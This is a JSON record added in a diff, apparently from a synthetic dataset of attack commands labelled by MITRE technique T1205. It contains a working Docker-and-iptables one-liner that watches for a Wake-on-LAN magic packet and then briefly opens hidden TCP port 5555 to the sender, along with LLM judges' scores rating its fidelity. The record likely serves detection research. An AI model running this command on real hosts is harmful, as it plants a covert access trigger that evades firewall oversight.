@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 9 -m string --hex-string '|FF FF FF FF FF FF|' --algo bm -j LOG --log-prefix 'T1205_WOL_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 9 -m string --hex-string '|FF FF FF FF FF FF|' --algo bm -m recent --name t1205_wol --set && iptables -I INPUT -p tcp --dport 5555 -m recent --name t1205_wol --rcheck --seconds 30 --reap -j ACCEPT\"",
+  "explanation": "Detects a Wake-on-LAN style magic packet (six 0xFF bytes) on UDP/9 as a signal. Logs the event and opens TCP/5555 briefly for the source IP. This applies a network-level magic packet characteristic of T1205.",
+  "rationale_steps": [
+    "Use Docker to configure iptables on the host.",
+    "Analyze UDP/9 payload for the WoL magic prefix as a covert signal.",
+    "Temporarily allow hidden TCP/5555 to the sender for 30 seconds."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-13bac07f",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid docker and iptables flags, and correctly chained operations.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly implements traffic signaling by detecting a WOL-like UDP/9 hex pattern, logging, setting a recent list, and temporarily opening TCP/5555, but it actually requires elevated Docker/NET_ADMIN privileges and uses a minimal WOL signature.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T12:49:44.772420Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper use of && separators, valid iptables flags, and correct Docker run syntax throughout.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements a port-knocking/traffic-signaling mechanism characteristic of T1205 by detecting WoL magic packet signatures (six 0xFF bytes) on UDP/9 and using iptables 'recent' module to conditionally open TCP/5555 for the triggering source IP within 30 seconds, though the --reap flag on the ACCEPT rule and the absence of a MAC address repetition check (true WoL magic packets contain the target MAC repeated 16 times after the 6 0xFF bytes) slightly reduce full operational fidelity.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T03:41:35.709507Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct Docker, shell, and iptables syntax, including proper quoting and module flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a traffic signaling mechanism using the iptables recent module to trigger a port opening upon receipt of a specific hex sequence.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T03:41:40.568536Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
